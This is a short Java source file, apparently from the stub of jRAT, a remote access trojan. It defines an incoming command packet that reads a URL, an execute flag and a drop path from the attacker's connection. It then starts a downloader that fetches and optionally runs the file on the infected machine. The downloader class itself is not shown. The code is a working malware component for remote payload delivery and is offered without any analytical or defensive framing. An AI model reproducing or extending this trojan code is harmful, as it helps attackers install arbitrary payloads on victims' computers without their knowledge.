package su.jrat.stub.packets.incoming;

import su.jrat.stub.AdvancedDownloader;
import su.jrat.stub.Connection;

public class Packet34AdvancedDownload extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		boolean exec = Connection.readBoolean();
		String drop = Connection.readLine().toLowerCase();
		new AdvancedDownloader(url, exec, drop).start();
	}

}
